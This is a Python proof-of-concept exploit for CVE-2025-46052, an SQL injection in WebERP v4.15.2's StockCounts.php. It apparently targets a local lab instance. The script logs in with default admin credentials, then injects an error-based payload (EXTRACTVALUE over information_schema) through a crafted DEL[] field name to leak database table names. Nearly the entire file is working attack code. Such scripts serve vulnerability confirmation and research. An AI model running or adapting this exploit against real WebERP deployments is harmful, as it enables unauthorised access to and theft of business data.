#!/usr/bin/env python3
import requests
import re
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "http://127.0.0.1:8083"
USERNAME = "admin"
PASSWORD = "weberp"
COMPANY = "weberpdemo"


def get_form_id(session, url):
    resp = session.get(url)
    match = re.search(r'name="FormID"\s+value="([^"]+)"', resp.text)
    if match:
        return match.group(1)
    return None


def login(session):
    login_url = f"{TARGET}/index.php"
    form_id = get_form_id(session, login_url)
    if not form_id:
        print("[-] Failed to get FormID from login page")
        return False
    
    data = {
        "FormID": form_id,
        "CompanyNameField": COMPANY,
        "UserNameEntryField": USERNAME,
        "Password": PASSWORD,
        "SubmitUser": "Login"
    }
    resp = session.post(login_url, data=data)
    if "Logout" in resp.text or "Dashboard" in resp.text:
        print("[+] Login successful")
        return True
    print("[-] Login failed")
    return False


def exploit(session):
    vuln_url = f"{TARGET}/StockCounts.php?Action=View"
    form_id = get_form_id(session, vuln_url)
    if not form_id:
        print("[-] Failed to get FormID from StockCounts.php")
        return False
    
    payload = "8' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema='weberpdemo' LIMIT 1 OFFSET 0)))-- "
    
    files = {
        "FormID": (None, form_id),
        "Action": (None, "View"),
        f"DEL[{payload}]": (None, "on"),
        "SubmitChanges": (None, "Save Changes")
    }
    
    print(f"[*] Sending SQL injection payload...")
    resp = session.post(vuln_url, files=files)
    
    match = re.search(r"XPATH syntax error: '~([^']+)'", resp.text)
    if match:
        extracted = match.group(1)
        print(f"[+] SQL Injection successful!")
        print(f"[+] Extracted data: {extracted}")
        return True
    
    if "syntax error" in resp.text.lower() or "sql" in resp.text.lower():
        print("[+] SQL error detected, injection works")
        match2 = re.search(r"(error[^<]+)", resp.text, re.IGNORECASE)
        if match2:
            print(f"[+] Error message: {match2.group(1)[:200]}")
        return True
    
    print("[-] SQL injection payload did not trigger expected error")
    return False


def main():
    session = requests.Session()
    session.verify = False
    
    print(f"[*] Target: {TARGET}")
    print(f"[*] CVE-2025-46052: WebERP v4.15.2 SQL Injection in StockCounts.php")
    print("-" * 60)
    
    if not login(session):
        sys.exit(1)
    
    if exploit(session):
        print("-" * 60)
        print("[+] Vulnerability confirmed: CVE-2025-46052")
        sys.exit(0)
    else:
        print("[-] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
